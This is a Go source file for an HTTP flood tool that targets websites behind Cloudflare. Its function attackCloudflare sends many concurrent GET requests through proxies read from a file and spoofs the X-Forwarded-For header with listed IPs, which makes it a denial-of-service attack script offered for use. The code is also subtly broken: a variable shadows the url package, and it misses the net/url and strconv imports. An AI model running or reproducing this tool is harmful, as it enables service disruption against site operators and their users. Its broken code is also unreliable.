package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

func attackCloudflare(url string, targetIP string, proxyURL string, requests int) {
	client := &http.Client{}
	proxy := func(_ *http.Request) (*url.URL, error) {
		return url.Parse(proxyURL)
	}
	client.Transport = &http.Transport{Proxy: proxy}

	var wg sync.WaitGroup

	for i := 0; i < requests; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			req, _ := http.NewRequest("GET", url, nil)
			req.Header.Set("X-Forwarded-For", targetIP)
			resp, err := client.Do(req)
			if err == nil {
				defer resp.Body.Close()
			}
		}()
	}

	wg.Wait()
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter the target URL behind Cloudflare: ")
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	proxyFilePath := "proxy.txt"

	fmt.Print("Enter the path to the text file containing target IPs: ")
	ipFilePath, _ := reader.ReadString('\n')
	ipFilePath = strings.TrimSpace(ipFilePath)

	fmt.Print("Enter the number of requests to send: ")
	numRequestsStr, _ := reader.ReadString('\n')
	numRequests, _ := strconv.Atoi(strings.TrimSpace(numRequestsStr))

	proxyFile, err := os.Open(proxyFilePath)
	if err != nil {
		fmt.Println("Error opening proxy file:", err)
		return
	}
	defer proxyFile.Close()

	ipFile, err := os.Open(ipFilePath)
	if err != nil {
		fmt.Println("Error opening IP file:", err)
		return
	}
	defer ipFile.Close()

	scanner := bufio.NewScanner(proxyFile)
	for scanner.Scan() {
		proxyURL := scanner.Text()

		ipScanner := bufio.NewScanner(ipFile)
		for ipScanner.Scan() {
			targetIP := ipScanner.Text()
			attackCloudflare(targetURL, targetIP, proxyURL, numRequests)
		}
		ipFile.Seek(0, 0)
	}
}
